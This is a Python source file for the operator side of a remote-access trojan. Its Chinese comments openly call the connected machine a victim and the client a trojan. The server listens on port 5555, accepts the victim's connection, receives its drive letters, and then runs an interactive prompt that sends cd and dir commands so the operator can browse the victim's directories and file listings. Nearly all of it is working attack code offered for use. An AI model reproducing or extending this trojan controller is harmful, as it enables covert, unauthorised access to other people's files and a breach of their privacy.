import pickle
from socket import*
# 定义全局变量
path = ''

# 鱼竿架好 鱼饵放好
S = socket()               # 创建监听套接字
S.bind(('0.0.0.0', 5555))  # 监听套接字绑定默认IP 5555端口号
S.listen()                 # 开启监听

# 有鱼上钩
s, addr = S.accept()
print(addr)

# 接收盘符信息
disk_info = s.recv(1024).decode().split('\x00')
disk_info.pop(-1)
print('小可爱的盘符信息:', disk_info)

while True:
    # 输入指令
    input_str = input(path+'> ')  # 输入指令

    # 处理这条指令
    command = input_str.split(' ', 1)  # 切割字符串  command[0] command[1]

    if command[0] == 'cd':
        if len(command) == 1:                  # 纯cd指令 切割之后指令列表中只有一个元素
            path = ''                           # 回到根目录
            print('小可爱的盘符信息:', disk_info)  # 显示盘符信息
        else:     # cd 后面有东西
            if path == '':  # 在根目录
                if command[1]+'\\' in disk_info:
                    path = command[1]
                else:
                    print(f'不存在{command[1]}盘符！')
                    print('小可爱的盘符信息:', disk_info)  # 显示盘符信息
                    continue
            else:
                path = path + '\\' + command[1]

    elif command[0] == 'dir':
        if path == '':  # 根目录 显示盘符信息
            print('小可爱的盘符信息:', disk_info)  # 显示盘符信息
        else:
            # 显示当前目录中的文件夹和文件！
            # 告诉他是什么指令  告诉他这条指令对应的目录 comand[0] path
            temp_command = command[0]+'|'+path  # dir|C:\\Users
            s.send(temp_command.encode())    # 发送出去

            # 由于受害者的文件实在太多可能出现问题 BUG！
            # 木马那边吧数据大小计算出来 先知道具体的大小 根据大小决定怎么接收
            dir_list = pickle.loads(s.recv(4096))
            print('=========================================================')
            for file, isfile, size in dir_list:
                print(f"{file:<30} {str(isfile):<10} {str(size):>10}")
            print('=========================================================')


s.close()
S.close()


















